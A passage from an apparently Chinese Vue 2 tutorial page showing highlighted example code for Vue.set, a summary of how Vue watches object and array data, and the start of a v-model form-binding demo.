class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：&#123;&#123;school.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;school.address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>校长是：&#123;&#123;school.leader&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加一个性别属性，默认值是男<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：真实&#123;&#123;student.age.rAge&#125;&#125;，对外&#123;&#123;student.age.sAge&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>爱好<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;h&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(f,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;f.name&#125;&#125;--&#123;&#123;f.age&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">school</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">student</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;tom&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">age</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">rAge</span>:<span class="number">40</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">sAge</span>:<span class="number">29</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">hobby</span>:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">friends</span>:[</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">name</span>:<span class="string">&#x27;jerry&#x27;</span>,<span class="attr">age</span>:<span class="number">35</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">36</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="总结Vue监视数据"><a href="#总结Vue监视数据" class="headerlink" title="总结Vue监视数据"></a>总结Vue监视数据</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>总结数据监视<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-tag">button</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--</span></span></span><br><span class="line"><span class="comment"><span class="xml">Vue监视数据的原理：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1. vue会监视data中所有层次的数据。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">2. 如何监测对象中的数据？</span></span></span><br><span class="line"><span class="comment"><span class="xml">通过setter实现监视，且要在new Vue时就传入要监测的数据。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).对象中后追加的属性，Vue默认不做响应式处理</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).如需给后添加的属性做响应式，请使用如下API：</span></span></span><br><span class="line"><span class="comment"><span class="xml">Vue.set(target，propertyName/index，value) 或 </span></span></span><br><span class="line"><span class="comment"><span class="xml">vm.$set(target，propertyName/index，value)</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">3. 如何监测数组中的数据？</span></span></span><br><span class="line"><span class="comment"><span class="xml">通过包裹数组更新元素的方法实现，本质就是做了两件事：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).调用原生对应的方法对数组进行更新。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).重新解析模板，进而更新页面。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">4.在Vue修改数组中的某个元素一定要用如下方法：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.Vue.set() 或 vm.$set()</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml">特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.age++&quot;</span>&gt;</span>年龄+1岁<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加性别属性，默认值：男<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;student.sex = &#x27;未知&#x27; &quot;</span>&gt;</span>修改性别<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addFriend&quot;</span>&gt;</span>在列表首位添加一个朋友<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateFirstFriendName&quot;</span>&gt;</span>修改第一个朋友的名字为：张三<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addHobby&quot;</span>&gt;</span>添加一个爱好<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateHobby&quot;</span>&gt;</span>修改第一个爱好为：开车<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;removeSmoke&quot;</span>&gt;</span>过滤掉爱好中的抽烟<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>姓名：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>年龄：&#123;&#123;student.age&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(h,index) in student.hobby&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;h&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(f,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;f.name&#125;&#125;--&#123;&#123;f.age&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">student</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;tom&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">age</span>:<span class="number">18</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">hobby</span>:[<span class="string">&#x27;抽烟&#x27;</span>,<span class="string">&#x27;喝酒&#x27;</span>,<span class="string">&#x27;烫头&#x27;</span>],</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">friends</span>:[</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">name</span>:<span class="string">&#x27;jerry&#x27;</span>,<span class="attr">age</span>:<span class="number">35</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">36</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">]</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">addFriend</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.student.friends.unshift(&#123;<span class="attr">name</span>:<span class="string">&#x27;jack&#x27;</span>,<span class="attr">age</span>:<span class="number">70</span>&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">updateFirstFriendName</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.student.friends[<span class="number">0</span>].name = <span class="string">&#x27;张三&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">addHobby</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.student.hobby.push(<span class="string">&#x27;学习&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">updateHobby</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// this.student.hobby.splice(0,1,&#x27;开车&#x27;)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// Vue.set(this.student.hobby,0,&#x27;开车&#x27;)</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student.hobby,<span class="number">0</span>,<span class="string">&#x27;开车&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">removeSmoke</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.student.hobby = <span class="built_in">this</span>.student.hobby.filter(<span class="function">(<span class="params">h</span>)=&gt;</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> h !== <span class="string">&#x27;抽烟&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="更新表单数据"><a href="#更新表单数据" class="headerlink" title="更新表单数据"></a>更新表单数据</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;天气案例_监视属性_简写&lt;/title&gt;</span><br><span class="line">    &lt;!-- 引入Vue --&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 准备好一个容器--&gt;</span><br><span class="line">    &lt;!-- </span><br><span class="line">        &lt;input type=&quot;radio&quot; name=&quot;单选按钮所在的组名&quot; value=&quot;单选按钮的取值&quot;&gt;</span><br><span class="line">        相同的 name 属性就是一个组，在这个组中只能单选一个</span><br><span class="line">        value 向服务器传递的数据 --&gt;</span><br><span class="line">    &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">        &lt;form @submit.prevent=&#x27;demo&#x27;&gt;</span><br><span class="line">            账号:&lt;input type=&quot;text&quot; v-model=&#x27;account&#x27;&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="line">            密码:&lt;input type=&quot;text&quot; v-model=&#x27;password&#x27;&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="line">            男 &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&#x27;male&#x27;&gt;</span><br><span class="line">            女 &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&#x27;female&#x27;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            爱好：</span><br><span class="line">            学习 &lt;input type=&quot;checkbox&quot; v-model=&#x27;hobby&#x27; value=&#x27;study&#x27;&gt;</span><br><span class="line">            打游戏 &lt;input type=&quot;checkbox&quot; v-model=&#x27;hobby&#x27; value=&#x27;game&#x27;&gt;</span><br><span class="line">            吃饭 &lt;input type=&quot;checkbox&quot; v-model=&#x27;hobby&#x27; value=&#x27;eat&#x27;&gt;</span><br><span class="line">            &lt;br&gt;&lt;br&gt;</span><br><span class="line">            &lt;select v-model=&#x27;city&#x27;&gt;</span><br><span class="line">                &lt;option value=&quot;&quot;&gt;</span><br><span class="line">                    请选择小区</span><br><span class="line">                &lt;/option&gt;</span><br><span class="line">                &lt;option value=&quot;beijing&quot;&gt;</span><br><span class="line">                    北京</span><br><span class="line">                &lt;/option&gt;</span><br><span class="line">                &lt;option value=&quot;shanghai&quot;&gt;</span><br><span class="line">                    上海</span><br><span class="line">                &lt;/option&gt;</span><br><span class="line">            &lt;/select&gt; &lt;br&gt; &lt;br&gt;</span><br><span class="line">            其他信息：</span><br><span class="line">            &lt;textarea v-model=&#x27;other&#x27;&gt;&lt;/textarea&gt;</span><br><span class="line">            &lt;input type=&quot;checkbox&quot; v-model=&quot;agree&quot;&gt; 阅读并接受:</span><br><span class="line">            &lt;a href=&quot;https://www.baidu.com&quot;&gt;&lt;/a&gt;</span><br><span class="line">            &lt;button&gt;提交&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script 